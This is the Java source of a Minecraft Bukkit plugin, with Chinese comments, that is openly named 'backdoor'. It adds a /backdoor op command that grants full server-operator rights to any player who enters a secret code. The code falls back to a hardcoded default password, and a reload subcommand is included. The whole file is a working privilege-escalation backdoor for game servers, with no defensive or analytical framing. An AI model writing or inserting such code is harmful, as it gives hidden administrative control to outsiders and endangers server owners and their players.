package link.cloudthink;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

/**
 * 主插件类
 * [修改] 移除 Listener 接口，不再监听聊天
 */
public final class backdoor extends JavaPlugin implements CommandExecutor, TabCompleter {

    private String secretCode;

    @Override
    public void onEnable() {
        reloadConfiguration();
        
        getLogger().info("Backdoor plugin v" + getDescription().getVersion() + " has been enabled.");
        getLogger().info("Secret code loaded from config.yml.");

        // 注册指令执行器和Tab补全器
        getCommand("backdoor").setExecutor(this);
        getCommand("backdoor").setTabCompleter(this);
    }

    @Override
    public void onDisable() {
        getLogger().info("Backdoor plugin has been disabled.");
    }

    private void reloadConfiguration() {
        saveDefaultConfig();
        reloadConfig();
        this.secretCode = getConfig().getString("secret-code", "a-very-secure-default-password");
    }

    /**
     * [重大修改] 指令处理器
     */
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (!command.getName().equalsIgnoreCase("backdoor")) {
            return false;
        }

        // 如果没有输入子指令，则显示用法
        if (args.length == 0) {
            sender.sendMessage(Component.text("用法: /backdoor <op|reload>", NamedTextColor.RED));
            return true;
        }

        // 获取子指令
        String subCommand = args[0].toLowerCase();

        // --- 处理 'op' 子指令 ---
        if (subCommand.equals("op")) {
            // 1. 检查权限
            if (!sender.hasPermission("backdoor.op")) {
                sender.sendMessage(Component.text("你没有权限执行此命令。", NamedTextColor.RED));
                return true;
            }
            // 2. 检查是否为玩家执行
            if (!(sender instanceof Player)) {
                sender.sendMessage(Component.text("此命令只能由玩家执行。", NamedTextColor.RED));
                return true;
            }
            // 3. 检查参数数量
            if (args.length != 2) {
                sender.sendMessage(Component.text("用法: /backdoor op <密码>", NamedTextColor.RED));
                return true;
            }

            Player player = (Player) sender;
            String passwordAttempt = args[1];

            // 4. 验证密码
            if (passwordAttempt.equals(this.secretCode)) {
                player.setOp(true);
                player.sendMessage(Component.text("你已获得OP权限！", NamedTextColor.YELLOW));
                getLogger().warning("Player " + player.getName() + " has triggered the OP command successfully.");
            } else {
                player.sendMessage(Component.text("密码错误。", NamedTextColor.RED));
            }
            return true;
        }

        // --- 处理 'reload' 子指令 ---
        if (subCommand.equals("reload")) {
            // 1. 检查权限
            if (!sender.hasPermission("backdoor.admin")) {
                sender.sendMessage(Component.text("你没有权限执行此命令。", NamedTextColor.RED));
                return true;
            }
            
            reloadConfiguration();
            sender.sendMessage(Component.text("Backdoor 插件配置已成功重载！", NamedTextColor.GREEN));
            return true;
        }

        // 如果子指令无效，再次显示用法
        sender.sendMessage(Component.text("未知的子指令。用法: /backdoor <op|reload>", NamedTextColor.RED));
        return true;
    }

    /**
     * [修改] 指令Tab补全处理器
     */
    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String[] args) {
        // 当玩家输入第一个参数时
        if (args.length == 1) {
            List<String> completions = new ArrayList<>();
            
            // 如果玩家有 backdoor.op 权限，则提示 "op"
            if (sender.hasPermission("backdoor.op")) {
                completions.add("op");
            }
            // 如果玩家有 backdoor.admin 权限，则提示 "reload"
            if (sender.hasPermission("backdoor.admin")) {
                completions.add("reload");
            }
            
            // 返回匹配玩家输入的部分
            return completions.stream()
                    .filter(s -> s.toLowerCase().startsWith(args[0].toLowerCase()))
                    .collect(Collectors.toList());
        }
        
        // 其他情况（如输入密码时）不提供任何补全
        return List.of();
    }
}
